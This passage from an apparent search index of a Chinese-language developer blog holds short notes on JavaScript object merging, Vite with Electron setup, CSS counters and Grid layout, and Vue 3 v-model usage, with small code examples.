","date":"2021-10-09","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-AIX-ibm-heapanalyzer-%E6%9F%A5%E8%A9%A2-Java-OOM-%E5%95%8F%E9%A1%8C/:0:0","tags":null,"title":"使用 AIX ibm-heapanalyzer 查詢 Java OOM 問題","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-AIX-ibm-heapanalyzer-%E6%9F%A5%E8%A9%A2-Java-OOM-%E5%95%8F%E9%A1%8C/"},{"categories":["JavaScript"],"content":"有時候自幹套件，使用 Object 去設定會非常簡單，但是會有物件繼承問題。要如何快速解決問題呢?我之前有使用過 jQuery.extend 來解決這個問題。但是最近寫 Vue，不太可能使用 Query ，我相信 ES6 應該有新寫法(還真的有)，這邊來整理一下。 ","date":"2021-10-09","objectID":"/blog/posts/JavaScript-Object-%E7%B9%BC%E6%89%BF%E7%89%A9%E4%BB%B6%E5%B1%AC%E6%80%A7%E5%A4%A7%E6%B3%95/:0:0","tags":["javascript","object","assign"],"title":"JavaScript Object 繼承物件屬性大法","uri":"/blog/posts/JavaScript-Object-%E7%B9%BC%E6%89%BF%E7%89%A9%E4%BB%B6%E5%B1%AC%E6%80%A7%E5%A4%A7%E6%B3%95/"},{"categories":["JavaScript"],"content":"“jQuery” var object1 = { apple: 0, banana: { weight: 52, price: 100 }, cherry: 97 }; var object2 = { banana: { price: 200 }, durian: 100 }; // Merge object2 into object1 $.extend( object1, object2 ); // {\"apple\":0,\"banana\":{\"weight\":52,\"price\":200},\"cherry\":97,\"durian\":100} jQuery.extend的用法-黑暗執行緒 jQuery.extend() | jQuery API Documentation 以下參考: You Might Not Need jQuery ","date":"2021-10-09","objectID":"/blog/posts/JavaScript-Object-%E7%B9%BC%E6%89%BF%E7%89%A9%E4%BB%B6%E5%B1%AC%E6%80%A7%E5%A4%A7%E6%B3%95/:1:0","tags":["javascript","object","assign"],"title":"JavaScript Object 繼承物件屬性大法","uri":"/blog/posts/JavaScript-Object-%E7%B9%BC%E6%89%BF%E7%89%A9%E4%BB%B6%E5%B1%AC%E6%80%A7%E5%A4%A7%E6%B3%95/"},{"categories":["JavaScript"],"content":"ES6 ECMAScript 6: merging objects via Object.assign() //Object.assign() Object.assign(target, source_1, ..., source_n) ","date":"2021-10-09","objectID":"/blog/posts/JavaScript-Object-%E7%B9%BC%E6%89%BF%E7%89%A9%E4%BB%B6%E5%B1%AC%E6%80%A7%E5%A4%A7%E6%B3%95/:2:0","tags":["javascript","object","assign"],"title":"JavaScript Object 繼承物件屬性大法","uri":"/blog/posts/JavaScript-Object-%E7%B9%BC%E6%89%BF%E7%89%A9%E4%BB%B6%E5%B1%AC%E6%80%A7%E5%A4%A7%E6%B3%95/"},{"categories":["JavaScript"],"content":"自幹大法 var extend = function(out) { out = out || {}; for (var i = 1; i \u003c arguments.length; i++) { if (!arguments[i]) continue; for (var key in arguments[i]) { if (arguments[i].hasOwnProperty(key)) out[key] = arguments[i][key]; } } return out; }; extend({}, objA, objB); ","date":"2021-10-09","objectID":"/blog/posts/JavaScript-Object-%E7%B9%BC%E6%89%BF%E7%89%A9%E4%BB%B6%E5%B1%AC%E6%80%A7%E5%A4%A7%E6%B3%95/:3:0","tags":["javascript","object","assign"],"title":"JavaScript Object 繼承物件屬性大法","uri":"/blog/posts/JavaScript-Object-%E7%B9%BC%E6%89%BF%E7%89%A9%E4%BB%B6%E5%B1%AC%E6%80%A7%E5%A4%A7%E6%B3%95/"},{"categories":["JavaScript"],"content":"vue 應用 \u003cinput type=\"number\" :value=\"settings.autotime\" @change=\"$emit('update:settings',{ autotime: $event.target.value})\" \u003e秒 updateSettings(settings){ console.log('updateSettings', settings) if(settings.hasOwnProperty('windowAlwaysOnTop')){ if(settings.windowAlwaysOnTop === true){ this.enableWindowAlwaysOnTop() }else{ this.diseableWindowAlwaysOnTop() } } const {windowAlwaysOnTop} = settings console.log('windowAlwaysOnTop',windowAlwaysOnTop) settings.windowAlwaysOnTop = windowAlwaysOnTop } }, 但這樣寫真的太麻煩了，每個屬性都要而外自己判斷，這時候我有想到 extend 類似特性可以用到。 updateSettings(settings){ console.log('updateSettings', settings) Object.assign(this.settings,settings) } }, watch:{ \"settings.windowAlwaysOnTop\"(newvalue,oldvalue){ console.log('watch settings.windowAlwaysOnTop',newvalue,oldvalue) console.log(this) if(newvalue){ this.enableWindowAlwaysOnTop() }else{ this.diseableWindowAlwaysOnTop() } } }, 程式碼可以更精簡設定。 ","date":"2021-10-09","objectID":"/blog/posts/JavaScript-Object-%E7%B9%BC%E6%89%BF%E7%89%A9%E4%BB%B6%E5%B1%AC%E6%80%A7%E5%A4%A7%E6%B3%95/:4:0","tags":["javascript","object","assign"],"title":"JavaScript Object 繼承物件屬性大法","uri":"/blog/posts/JavaScript-Object-%E7%B9%BC%E6%89%BF%E7%89%A9%E4%BB%B6%E5%B1%AC%E6%80%A7%E5%A4%A7%E6%B3%95/"},{"categories":["JavaScript"],"content":"JSON.parse(JSON.stringify(xxxx)) JSON.parse(JSON.stringify(xxxx)) ","date":"2021-10-09","objectID":"/blog/posts/JavaScript-Object-%E7%B9%BC%E6%89%BF%E7%89%A9%E4%BB%B6%E5%B1%AC%E6%80%A7%E5%A4%A7%E6%B3%95/:5:0","tags":["javascript","object","assign"],"title":"JavaScript Object 繼承物件屬性大法","uri":"/blog/posts/JavaScript-Object-%E7%B9%BC%E6%89%BF%E7%89%A9%E4%BB%B6%E5%B1%AC%E6%80%A7%E5%A4%A7%E6%B3%95/"},{"categories":["Vite"],"content":"Vite 搭配 Electron 整理(不使用TypeScript) cawa-93/vite-electron-builder: Secure boilerplate for Electron app based on Vite. TypeScript + Vue/React/Angular/Svelte/Vanilla Vue3+Electron整合方式 - 知乎 目前好像沒有官方推薦的，不過我選方案一，因為官方有特別註明怎麼調回 JavaScript，我 TypeScript 還沒有學。Orz ","date":"2021-10-09","objectID":"/blog/posts/Vite-%E6%90%AD%E9%85%8D-Electron-%E6%95%B4%E7%90%86-%E4%B8%8D%E4%BD%BF%E7%94%A8TypeScript/:0:0","tags":["vite","electron","javascript"],"title":"Vite 搭配 Electron 整理(不使用TypeScript)","uri":"/blog/posts/Vite-%E6%90%AD%E9%85%8D-Electron-%E6%95%B4%E7%90%86-%E4%B8%8D%E4%BD%BF%E7%94%A8TypeScript/"},{"categories":["Vite"],"content":"調成 JavaScript 推薦看官網教學，也有可能因為時間更新而改變。 ","date":"2021-10-09","objectID":"/blog/posts/Vite-%E6%90%AD%E9%85%8D-Electron-%E6%95%B4%E7%90%86-%E4%B8%8D%E4%BD%BF%E7%94%A8TypeScript/:1:0","tags":["vite","electron","javascript"],"title":"Vite 搭配 Electron 整理(不使用TypeScript)","uri":"/blog/posts/Vite-%E6%90%AD%E9%85%8D-Electron-%E6%95%B4%E7%90%86-%E4%B8%8D%E4%BD%BF%E7%94%A8TypeScript/"},{"categories":["Vite"],"content":"快速建置範本專案 Create a New Repository from cawa-93/vite-electron-builder ","date":"2021-10-09","objectID":"/blog/posts/Vite-%E6%90%AD%E9%85%8D-Electron-%E6%95%B4%E7%90%86-%E4%B8%8D%E4%BD%BF%E7%94%A8TypeScript/:1:1","tags":["vite","electron","javascript"],"title":"Vite 搭配 Electron 整理(不使用TypeScript)","uri":"/blog/posts/Vite-%E6%90%AD%E9%85%8D-Electron-%E6%95%B4%E7%90%86-%E4%B8%8D%E4%BD%BF%E7%94%A8TypeScript/"},{"categories":["Vite"],"content":"移除 JavaScript Guide to disable typescript and remove dependencies · Discussion #339 · cawa-93/vite-electron-builder In project root: Remove vetur.config.js Remove .github/workflows/typechecking.yml Remove types directory Remove tsconfig.json directory In package.json Remove buildEnvTypes, pretypecheck and all typecheck* sctipts(我找不到…) \"typecheck-main\": \"tsc --noEmit -p packages/main/tsconfig.json\", \"typecheck-preload\": \"tsc --noEmit -p packages/preload/tsconfig.json\", \"typecheck-renderer\": \"vue-tsc --noEmit -p packages/renderer/tsconfig.json\", \"typecheck\": \"npm run typecheck-main \u0026\u0026 npm run typecheck-preload \u0026\u0026 npm run typecheck-renderer\" \"pre-push\": \"npm run typecheck\" Remove simple-git-hooks.pre-push and run npx simple-git-hooks to update git-hooks internal config \"pre-push\": \"npm run typecheck\" npx simple-git-hooks Remove unnecessary dependencies by: npm uninstall @types/electron-devtools-installer @typescript-eslint/eslint-plugin typescript vue-tsc In .eslintrc.json Remove: plugin:@typescript-eslint/recommended from extends parser parserOptions @typescript-eslint from plugins types/env.d.ts from ignorePatterns All @typescript-eslint/* from rules 下面不要拿掉，不然git commit 會有錯誤(eslint 會報錯) \"parserOptions\": { \"ecmaVersion\": 12, \"sourceType\": \"module\" }, In packages/main: Rewrite src/index.ts to src/index.js (改名) In vite.config.js change build.lib.entry to src/index.js Remove tsconfig.json In packages/preload: Rewrite src/index.ts to src/index.js In vite.config.js change build.lib.entry to src/index.js Remove tsconfig.json Remove types directory In packages/renderer: Rewrite all files in src from TS to JS. If you want use Vue, you need remove lang=\"ts\" attribute in all .vue files. In index.html change script src attribute to you new entry file (it may be ./src/index.js for example). Remove tsconfig.json In .eslintrc.json remove parserOptions.parser Remove types directory ","date":"2021-10-09","objectID":"/blog/posts/Vite-%E6%90%AD%E9%85%8D-Electron-%E6%95%B4%E7%90%86-%E4%B8%8D%E4%BD%BF%E7%94%A8TypeScript/:1:2","tags":["vite","electron","javascript"],"title":"Vite 搭配 Electron 整理(不使用TypeScript)","uri":"/blog/posts/Vite-%E6%90%AD%E9%85%8D-Electron-%E6%95%B4%E7%90%86-%E4%B8%8D%E4%BD%BF%E7%94%A8TypeScript/"},{"categories":["Vite"],"content":"ExtensionLoadWarning(無法解決) (node:19656) ExtensionLoadWarning: Warnings loading extension at · Issue #943 · nklayman/vue-cli-plugin-electron-builder npm install electron-devtools-installer --save-dev const { default: installExtension, REACT_DEVELOPER_TOOLS } = require('electron-devtools-installer'); try { await installExtension({ id: 'ljjemllljcmogpfapbkkighbhhppjdbg', //Vue Devtools beta electron: '\u003e=1.2.1' }) } catch (e) { console.error('Vue Devtools failed to install:', e.toString()) } ","date":"2021-10-09","objectID":"/blog/posts/Vite-%E6%90%AD%E9%85%8D-Electron-%E6%95%B4%E7%90%86-%E4%B8%8D%E4%BD%BF%E7%94%A8TypeScript/:1:3","tags":["vite","electron","javascript"],"title":"Vite 搭配 Electron 整理(不使用TypeScript)","uri":"/blog/posts/Vite-%E6%90%AD%E9%85%8D-Electron-%E6%95%B4%E7%90%86-%E4%B8%8D%E4%BD%BF%E7%94%A8TypeScript/"},{"categories":["Vite"],"content":"彩蛋 調整 Electron 視窗資料，實用功能 MarshallOfSound/electron-devtools-installer: An easy way to ensure Chrome DevTools extensions into Electron 如何实现 electron 窗体透明 transparent 效果？ transparent: true 拖移視窗 electron程序，自定义标题栏的几个特殊css属性总结 -webkit-app-region: drag; electron程序，如何隐藏窗体顶部菜单？ autoHideMenuBar:true frame:false Frameless window with controls in electron (Windows) - Stack Overflow electron - 无边框、最大化、最小化、等比缩放问题_wanzheng_96的博客-CSDN博客 javascript - Electron require() is not defined - Stack Overflow Electron 12+ 出現 require is not defined 報錯解決_Jesse_0 - MdEditor electron - 无边框、最大化、最小化、等比缩放问题 無法使用在最新版程式 app.on('ready', () =\u003e { mainWindow = new BrowserWindow({ webPreferences: { nodeIntegration: true, contextIsolation: false, } }); }); 後來發現會現行的 RENDER 會有種突，所以還是不要這樣用。 解決方式 main 程式寫 electron 程式碼 原Web 操作寫在 preload HTML(App.vue)可以這樣呼叫 preload 程式 有空在寫仔細，就怕沒控整理。先簡單記錄 Electron 自动热更新丨阿西河 ","date":"2021-10-09","objectID":"/blog/posts/Vite-%E6%90%AD%E9%85%8D-Electron-%E6%95%B4%E7%90%86-%E4%B8%8D%E4%BD%BF%E7%94%A8TypeScript/:2:0","tags":["vite","electron","javascript"],"title":"Vite 搭配 Electron 整理(不使用TypeScript)","uri":"/blog/posts/Vite-%E6%90%AD%E9%85%8D-Electron-%E6%95%B4%E7%90%86-%E4%B8%8D%E4%BD%BF%E7%94%A8TypeScript/"},{"categories":["CSS"],"content":"CSS 偽造元素(::before)顯示序號(counter) 重新認識 CSS - Pseudo-element (偽元素) | Titangene Blog Custom List Number Styling | CSS-Tricks [CSS 年終特賣] 讓 CSS 自動幫你數數 ","date":"2021-10-09","objectID":"/blog/posts/CSS-%E5%81%BD%E9%80%A0%E5%85%83%E7%B4%A0-before-%E9%A1%AF%E7%A4%BA%E5%BA%8F%E8%99%9F-counter/:0:0","tags":["css"],"title":"CSS 偽造元素(::before)顯示序號(counter)","uri":"/blog/posts/CSS-%E5%81%BD%E9%80%A0%E5%85%83%E7%B4%A0-before-%E9%A1%AF%E7%A4%BA%E5%BA%8F%E8%99%9F-counter/"},{"categories":["CSS"],"content":"簡單範例 zxx-grid zxx-item::before{ content: \"0\" counter(section); font-weight: bold; font-size: 3rem; line-height: 1; position: absolute; right: 0px; bottom: 0px; } zxx-grid zxx-item{ position: relative; counter-increment: section; } ","date":"2021-10-09","objectID":"/blog/posts/CSS-%E5%81%BD%E9%80%A0%E5%85%83%E7%B4%A0-before-%E9%A1%AF%E7%A4%BA%E5%BA%8F%E8%99%9F-counter/:1:0","tags":["css"],"title":"CSS 偽造元素(::before)顯示序號(counter)","uri":"/blog/posts/CSS-%E5%81%BD%E9%80%A0%E5%85%83%E7%B4%A0-before-%E9%A1%AF%E7%A4%BA%E5%BA%8F%E8%99%9F-counter/"},{"categories":["CSS"],"content":"簡單說明 重點整理: counter-reset:num; 放在父層 counter-increment: num;、content: counter(num) \".\";放在子層， https://jsbin.com/yebulahabu/edit?html,css,output ","date":"2021-10-09","objectID":"/blog/posts/CSS-%E5%81%BD%E9%80%A0%E5%85%83%E7%B4%A0-before-%E9%A1%AF%E7%A4%BA%E5%BA%8F%E8%99%9F-counter/:2:0","tags":["css"],"title":"CSS 偽造元素(::before)顯示序號(counter)","uri":"/blog/posts/CSS-%E5%81%BD%E9%80%A0%E5%85%83%E7%B4%A0-before-%E9%A1%AF%E7%A4%BA%E5%BA%8F%E8%99%9F-counter/"},{"categories":["CSS"],"content":"網路文章 CSS 偽元素 ( content 與 counter ) - OXXO.STUDIO ","date":"2021-10-09","objectID":"/blog/posts/CSS-%E5%81%BD%E9%80%A0%E5%85%83%E7%B4%A0-before-%E9%A1%AF%E7%A4%BA%E5%BA%8F%E8%99%9F-counter/:3:0","tags":["css"],"title":"CSS 偽造元素(::before)顯示序號(counter)","uri":"/blog/posts/CSS-%E5%81%BD%E9%80%A0%E5%85%83%E7%B4%A0-before-%E9%A1%AF%E7%A4%BA%E5%BA%8F%E8%99%9F-counter/"},{"categories":["Vue"],"content":"之前在學 Vue 2 的時候，稍微釐清 v-model 觀念。但一陣子沒用了，忘了差不多，今天在讀 Vue3 順便來回顧一下之前觀念，順便來筆記一下。 ","date":"2021-10-09","objectID":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/:0:0","tags":["vue","v-model"],"title":"Vue3 v-model 語法糖","uri":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/"},{"categories":["Vue"],"content":"一般 Component \u003cChildComponent v-model=\"pageTitle\" /\u003e \u003c!-- 簡寫: --\u003e \u003cChildComponent :modelValue=\"pageTitle\" @update:modelValue=\"pageTitle = $event\" ","date":"2021-10-09","objectID":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/:1:0","tags":["vue","v-model"],"title":"Vue3 v-model 語法糖","uri":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/"},{"categories":["Vue"],"content":"重點1(簡寫) 簡單說明 v-model 簡寫 =\u003e :modelValue=\"xxx\" @update:modelValue=\"xxxx\" 現在 Vue 3 也可以控制 v-model而外變數 v-model:title =\u003e :title=\"xxx\" @update:title=\"xxxx\" ","date":"2021-10-09","objectID":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/:1:1","tags":["vue","v-model"],"title":"Vue3 v-model 語法糖","uri":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/"},{"categories":["Vue"],"content":"重點2(觸發 Event 改變 ModelValue 值) 這邊 @update:modelValue=\"xxx\"和@update:title=\"xxxx\" 這邊需要知道 Vue 處理 Event 方式，內層 Component 使用 this.$emit('update:modelValue',changeValue)去做 Event 觸發動作 ","date":"2021-10-09","objectID":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/:1:2","tags":["vue","v-model"],"title":"Vue3 v-model 語法糖","uri":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/"},{"categories":["Vue"],"content":"Form ModelValue一些方式 我們前一篇講到 Component 簡寫，但在 Form(input , textarea …)就不是這樣了。 自己有在官方文件看到寫法。 \u003cinput v-model=\"searchText\" /\u003e \u003c!-- 簡寫 --\u003e \u003cinput :value=\"searchText\" @input=\"searchText = $event.target.value\" /\u003e Form Input Bindings | Vue.js ","date":"2021-10-09","objectID":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/:2:0","tags":["vue","v-model"],"title":"Vue3 v-model 語法糖","uri":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/"},{"categories":["Vue"],"content":"select 一般 select 寫法 \u003cdiv id=\"v-model-select-dynamic\" class=\"demo\"\u003e \u003cselect v-model=\"selected\"\u003e \u003coption v-for=\"option in options\" :value=\"option.value\"\u003e {{ option.text }} \u003c/option\u003e \u003c/select\u003e \u003cspan\u003eSelected: {{ selected }}\u003c/span\u003e \u003c/div\u003e Vue.createApp({ data() { return { selected: 'A', options: [ { text: 'One', value: 'A' }, { text: 'Two', value: 'B' }, { text: 'Three', value: 'C' } ] } } }).mount('#v-model-select-dynamic') ","date":"2021-10-09","objectID":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/:2:1","tags":["vue","v-model"],"title":"Vue3 v-model 語法糖","uri":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/"},{"categories":["Vue"],"content":"checkbox \u003c!-- `picked` is a string \"a\" when checked --\u003e \u003cinput type=\"radio\" v-model=\"picked\" value=\"a\" /\u003e \u003c!-- `toggle` is either true or false --\u003e \u003cinput type=\"checkbox\" v-model=\"toggle\" /\u003e \u003c!-- `selected` is a string \"abc\" when the first option is selected --\u003e \u003cselect v-model=\"selected\"\u003e \u003coption value=\"abc\"\u003eABC\u003c/option\u003e \u003c/select\u003e true-value,false-value \u003cinput type=\"checkbox\" v-model=\"toggle\" true-value=\"yes\" false-value=\"no\" /\u003e true ==\u003e ‘yes’ false ==\u003e ‘false’ 補充 v-model 語法糖寫法 Vue.component('checkbox', { model: { prop: 'checked', event: 'change' }, props: { checked: { type: Boolean, default: false } }, template: ` \u003cinput type=\"checkbox\" @input=\"onInput\" @change=\"onChange\"/\u003e `, methods: { onInput (e) { console.log('onInput', e) }, onChange (e) { console.log('onChange', e) this.$emit('change', e.target.checked) } } }) 注意這邊不是用event.target.value，是用event.target.checked。這個問題讓我卡了幾小時的bug 😢😢😢 參考來源: Vue v-model语法糖 - 知乎 Vue.js Core 30天屠龍記(第26天): 客製事件 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2021-10-09","objectID":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/:2:2","tags":["vue","v-model"],"title":"Vue3 v-model 語法糖","uri":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/"},{"categories":["Vue"],"content":"Radio \u003cinput type=\"radio\" v-model=\"pick\" v-bind:value=\"a\" /\u003e // when checked: vm.pick === vm.a ","date":"2021-10-09","objectID":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/:2:3","tags":["vue","v-model"],"title":"Vue3 v-model 語法糖","uri":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/"},{"categories":["Vue"],"content":"select option \u003cselect v-model=\"selected\"\u003e \u003c!-- inline object literal --\u003e \u003coption :value=\"{ number: 123 }\"\u003e123\u003c/option\u003e \u003c/select\u003e // when selected: typeof vm.selected // =\u003e 'object' vm.selected.number // =\u003e 123 ","date":"2021-10-09","objectID":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/:2:4","tags":["vue","v-model"],"title":"Vue3 v-model 語法糖","uri":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/"},{"categories":["Vue"],"content":"修飾詞(這邊都是 form 相關 tag 限定) lazy change event 才做改變值動作 number \u003cinput type=\"number\" v-model.number=\"xxx\" /\u003e 這邊注意，type沒限定一定要用 number，這邊指令text的話，純文字(沒打英文)會顯示字串。所以搭配 type 還是最好用 number做限定。 trim 只能用在 v-model Components Basics | Vue.js ","date":"2021-10-09","objectID":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/:2:5","tags":["vue","v-model"],"title":"Vue3 v-model 語法糖","uri":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/"},{"categories":["Vue"],"content":"相關文章 v-model | Vue3中文文档 - vuejs 自定义事件 | Vue3中文文档 - vuejs Vue v-model语法糖 - 知乎 v-model之vue2与3的差别 - 知乎 ","date":"2021-10-09","objectID":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/:3:0","tags":["vue","v-model"],"title":"Vue3 v-model 語法糖","uri":"/blog/posts/Vue3-v-model-%E8%AA%9E%E6%B3%95%E7%B3%96/"},{"categories":["CSS"],"content":"CSS Grid 筆記(writed) 推薦新法先看[CSS] 關於 Grid Layout 的使用姿勢，了解觀念在看語法內容比較不會誤會。 ","date":"2021-10-09","objectID":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/:0:0","tags":["css","grid"],"title":"CSS Grid 筆記","uri":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"grid-auto-flow ","date":"2021-10-09","objectID":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/:1:0","tags":["css","grid"],"title":"CSS Grid 筆記","uri":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"先前使用 grid(錯誤觀念) display: grid 就會變縱向，但是因為沒有設定 grid-template,grid-auto-columns所以只會有一列，所以設定上還是了解一下比較清楚。 ","date":"2021-10-09","objectID":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/:1:1","tags":["css","grid"],"title":"CSS Grid 筆記","uri":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"grid-auto-flow (排序方向) CSS grid-auto-flow深入理解 « 张鑫旭-鑫空间-鑫生活 grid-auto-flow : row grid-auto-flow - CSS: Cascading Style Sheets | MDN ","date":"2021-10-09","objectID":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/:1:2","tags":["css","grid"],"title":"CSS Grid 筆記","uri":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"fr 是什麼? 首先大家一定要搞清楚一点，1fr 1fr并不等于50% 50%，虽然很多时候表现是一样的，但只是grid格子正好和设定数量一致的时候。1fr 1fr更准确的含义是，可用剩余空间分别50% 50%。 我這邊看到 fr 塞超過 grid 所容量，結果 fr 都那一塊都沒辦法正常顯示，原來是剩餘空間關係造成的。 ","date":"2021-10-09","objectID":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/:2:0","tags":["css","grid"],"title":"CSS Grid 筆記","uri":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"fr 跟 auto 呢 ","date":"2021-10-09","objectID":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/:2:1","tags":["css","grid"],"title":"CSS Grid 筆記","uri":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"使用 demo 測試 fr 跟 auto 例用 CSS grid-auto-flow深入理解 « 张鑫旭-鑫空间-鑫生活 裡面「grid佈局實現圖像A|B+C佈局demo」範例來看 grid 的fr 和 auto 差異。 前置作業，使用CSS加圖序號清單。 zxx-grid zxx-item::before{ content: \"0\" counter(section); font-weight: bold; font-size: 3rem; line-height: 1; position: absolute; right: 0px; bottom: 0px; } zxx-grid zxx-item{ position: relative; counter-increment: section; } 使用開發者工具，在後面加入多個圖。 grid-template: 1fr 1fr / 1fr 1fr 1fr 可以看到因為後面加進來的大小都是原圖大小(grid-auto-row,grid-auto-column)，然後所暫空間都用滿了，所以圖片都看不到。 auto auto / auto auto auto auto會以最小圖來成現。 TODO: 確認 這邊小記一下，寬度會受影響，但高度確不會，因為高度沒有100%的問題。 ","date":"2021-10-09","objectID":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/:2:2","tags":["css","grid"],"title":"CSS Grid 筆記","uri":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"grid-auto-rows ,grid-auto-columns 其實直接看文件不是很清楚到底是甚麼關係，但去了解關鍵字名稱，再回來看就很清楚。 關鍵字: Grid Implicit vs Explicit Tracks explicit 的 grid 可以透過 grid-template-columns 和 grid-template-rows 來定義，剩餘多出來的 grid 都視為 implicit grid。 implicit grid 預設的寬度會根據內容的大小來改變，若想改變 implicit grid 的話，可以透過 grid-auto-rows 和 grid-auto-columns 來定義。 參考: [CSS] Grid Layout | PJCHENder 未整理筆記 簡單來說，grid-template 設定出 explicit，超出grid-template 就是 Grid Implicit。上面的範例其實就是 Grid Implicit 。 這個網站有demo範例，CSS Grid 筆記 05-CSS Grid Implicit vs Explicit Tracks | ShunNien’s Blog https://developer.mozilla.org/zh-TW/docs/Web/CSS/grid-template 是將所有三個長期屬性設置為的關鍵字none，表示沒有顯式網格。沒有命名的網格區域。行和列將隱式生成；它們的大小將由 grid-auto-rows (en-US)和 grid-auto-columns (en-US)屬性確定。 ","date":"2021-10-09","objectID":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/:3:0","tags":["css","grid"],"title":"CSS Grid 筆記","uri":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"grid-item 中文叫「Grid Item 」。主要控制所選擇大小。 這邊主要要記得編號開頭順序是從1開始編號，column是紅色，row是綠色開始算。只要在 grid 下的item 設定grid-column-start~grid-column-end和gird-row-start~grid-row-end就可以現在畫面上 上圖使用這邊範例CSS格線布局 - CSS | MDN grid-column: xxx / xxx 或 span 2 grid-column-start grid-column-end grid-row: xxx/xxx 或 span 2 grid-row-start grid-row-end grid-area: https://developer.mozilla.org/en-US/docs/Web/CSS/grid-area ","date":"2021-10-09","objectID":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/:4:0","tags":["css","grid"],"title":"CSS Grid 筆記","uri":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"span grid-row: span 2; ","date":"2021-10-09","objectID":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/:4:1","tags":["css","grid"],"title":"CSS Grid 筆記","uri":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"repeat grid-template-area: repeat(5, 1fr); ","date":"2021-10-09","objectID":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/:4:2","tags":["css","grid"],"title":"CSS Grid 筆記","uri":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"minmax(100px,auto) 最小 100px 最大 auto auto。auto 意味著大小會檢查內容大小，並適配這一行 cell 內最高項目的高度。 ","date":"2021-10-09","objectID":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/:4:3","tags":["css","grid"],"title":"CSS Grid 筆記","uri":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"grid-item 重疊會發生什麼事情? grid-row/grid-column 有兩個 item 設定一樣(或撞號)不會有任何問題。 後面Element 會在 Element 上面，這邊跟順序有關係。 其實上面MDN範例就可以看出來，只是grid-template,grid-row,grid-item 都會一樣有這種狀況。 ","date":"2021-10-09","objectID":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/:4:4","tags":["css","grid"],"title":"CSS Grid 筆記","uri":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"總結 https://nicolakacha.coderbridge.io/2020/09/22/css-flex-grid-2/ 我覺得這篇還滿適合當 cheet sheet ，因為算介紹滿完整又簡短，我覺得看完教學再回來看會比較好懂。 大部分網站都沒有介紹很完整，要了解需要花了一些時間，雖然寫的筆記未必很清楚，但整理資源方便下次回來看能快速熟悉。 ","date":"2021-10-09","objectID":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/:5:0","tags":["css","grid"],"title":"CSS Grid 筆記","uri":"/blog/posts/CSS-Grid-%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"Vue 動畫過渡(Transition) 筆記 ","date":"2021-10-09","objectID":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/:0:0","tags":["vue"],"title":"Vue 動畫過渡(Transition) 筆記","uri":"/blog/posts/Vue-%E5%8B%95%E7%95%AB%E9%81%8E%E6%B8%A1-Transition-%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"WEB 動畫知識 一個是 Transition，另一個是 Animation。 